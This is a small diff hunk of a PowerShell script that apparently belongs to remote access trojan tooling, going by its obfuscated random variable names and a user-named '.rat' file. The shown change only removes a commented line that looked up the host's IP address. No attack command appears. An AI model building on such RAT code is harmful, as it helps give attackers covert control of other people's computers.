@@ -31,7 +31,6 @@ $NyZnoLKCIs = Get-Location
 $CRYnrkaDbe = "$env:UserName.rat"
 $oNumpPlFnH = Get-Content XbrMzmCUiE.txt
 $XpKqtwxTVC = Get-Content UJbMLjTIDr.txt
-# $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 $AhdjktGyiZ = (
     Get-NetIPConfiguration |
     Where-Object {
